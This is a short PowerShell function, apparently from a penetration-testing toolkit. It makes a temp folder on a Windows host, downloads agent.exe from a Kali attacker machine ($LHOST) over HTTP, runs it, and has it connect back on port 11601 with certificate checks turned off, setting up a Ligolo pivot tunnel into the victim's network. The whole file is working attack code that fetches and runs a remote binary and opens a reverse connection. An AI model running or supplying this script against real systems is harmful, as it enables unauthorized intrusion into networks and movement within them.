function Invoke-Ligolo(){ 

[cmdletbinding()] Param(
    
     [Parameter(Position = 0, Mandatory = $true)]
     [string]
     $LHOST,
     [Parameter(ParameterSetName="help")]
     [Switch]
     $help
)

mkdir C:\Temp
cd C:\Temp
if (Test-Path -Path ".\agent.exe" -PathType Leaf) {
    Write-Host "File agent.exe is has already been downloading. Connecting with agent.exe"
    .\agent.exe -connect $LHOST':11601' -ignore-cert
} else {
    Read-Host -Prompt "Start web server on port 80 on kali, where agent.exe resides"
    wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
    .\agent.exe -connect $LHOST':11601' -ignore-cert
}
}
